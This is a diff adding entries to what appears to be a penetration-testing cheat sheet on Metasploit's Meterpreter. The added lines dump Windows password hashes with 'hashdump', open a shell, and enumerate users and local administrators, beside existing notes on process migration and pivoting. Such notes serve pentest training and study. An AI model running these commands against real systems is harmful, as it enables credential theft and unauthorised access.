@@ -167,6 +167,26 @@ meterpreter> pgrep explorer.exe
 ```
 meterpreter> migrate -N explorer.exe
 ```
+#### To dump hashes on meterpreter
+```
+meterpreter> hashdump
+```
+#### To drop into a shell after getting a meterpreter session
+```
+meterpreter> shell
+```
+#### To list all user accounts on the windows server
+```
+C:\> net user
+```
+#### To list users that belongs to the local administrator's group
+```
+C:\> net localgroup administrators
+```
+#### To know the user account you are in
+```
+C:\> whoami
+```
 
 ## Pivoting with meterpreter
 
